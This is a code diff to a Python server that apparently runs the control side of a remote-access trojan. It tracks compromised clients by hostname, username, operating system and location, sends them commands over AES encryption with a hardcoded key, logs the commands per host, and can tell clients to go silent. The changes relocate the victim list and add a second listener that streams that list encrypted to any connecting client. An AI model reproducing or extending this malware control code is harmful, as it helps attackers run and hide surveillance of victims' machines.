@@ -8,11 +8,11 @@ from tabulate import tabulate
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad,unpad
 from Crypto.Random import get_random_bytes
-from base64 import b64decode
-from base64 import b64encode
+
 
 Host = "192.168.140.65"
 Port = 6565
+test_PORT = 2121
 client_list=[]
 address_list = []
 aes_key = b'o\x802\x0ez\xe0\x8f\x8b\xc7>\xbf\x9fce\x85\xd3'
@@ -103,7 +103,7 @@ HORSE ="""
 def data_read():
     try:
         while data_collection:
-            with open('/var/www/html/client_list.json') as f:
+            with open('./Data/client_list.json') as f:
                 global data 
                 data = json.load(f)
             time.sleep(1)
@@ -143,6 +143,24 @@ def log_saver(HostName,command):
     with open(f"./Data/log/{HostName}.txt",'a') as history:
         history.write(f'{command}\n')
 
+
+
+def test_connect(server):
+    try:
+        while 1:
+            client, address = server.accept()
+            with open(f"./Data/client_list.json",'rb') as f:
+                chunk = f.read(4096)
+                while chunk :
+                    client.send(encrypt_data(chunk))
+                    chunk = f.read(4096)
+                time.sleep(0.3)
+                client.send(encrypt_data(b"\n\r"))
+        
+    except Exception as e:
+        print(e)
+
+
 def client_connected(server):
     try:
         while 1:
@@ -177,12 +195,12 @@ def check_hostname(HostName,client,address):
             "HostName" : HostName,
             "UserName" : info["username"],
             "System": info["system"],
-            "Loc": info["country"]+"\\"+info["city"],
+            "Loc": info["country"]+"/"+info["city"],
             "NickName" : HostName,
             "Status" : "True"
         }
         data['client_list'].append(new_client)
-    with open("/var/www/html/client_list.json","w") as f:
+    with open("./Data/client_list.json","w") as f:
         json.dump(data,f,indent=4)
     output(colour.info(f"[*] {HostName} connected."))
             
@@ -293,7 +311,7 @@ def nick(HostName,NickName):
             history_saver(f"[*] {HostName}'s NickName Changed as: {NickName}")
             print(colour.info(f"[*] {HostName}'s NickName Changed as: {NickName}"))
             client["NickName"] = NickName
-            with open('/var/www/html/client_list.json', 'w') as f:
+            with open('./Data/client_list.json', 'w') as f:
                 json.dump(data, f,indent=4)
 
 def close():
@@ -305,7 +323,7 @@ def close():
     data_collection = False 
     for client in data['client_list']:
         client["Status"] = "False"
-    with open('/var/www/html/client_list.json', 'w') as f:
+    with open('./Data/client_list.json', 'w') as f:
         json.dump(data, f,indent=4)
                        
     ### send message to client for go silent mode ###
@@ -326,7 +344,7 @@ def start(NickName):
             history_saver(f"[*] {NickName}'s Status Changed as: True ")
             print(colour.info(f"[*] {NickName}'s Status Changed as: True"))
             client["Status"] = "True"
-            with open('/var/www/html/client_list.json', 'w') as f:
+            with open('./Data/client_list.json', 'w') as f:
                 json.dump(data, f,indent=4)
 
 
@@ -337,7 +355,7 @@ def stop(NickName):
             print(colour.info(f"[*] {NickName}'s Status Changed as: False"))
             client["Status"] = "False"
             IP = client["IP"]
-            with open('/var/www/html/client_list.json', 'w') as f:
+            with open('./Data/client_list.json', 'w') as f:
                 json.dump(data, f,indent=4)
     for client in client_list : 
         raddr = client.getpeername()[0] if client else None
@@ -357,8 +375,13 @@ if __name__ == "__main__":
     server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     server.bind((Host,Port))
     server.listen(10)
+    test = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    test.bind((Host,test_PORT))
+    test.listen(3)
     client_collector = threading.Thread(target=client_connected,args=(server,))
     client_collector.start()
+    test_connectiot = threading.Thread(target=test_connect,args=(test,))
+    test_connectiot.start()
     
     start_data_read()
     
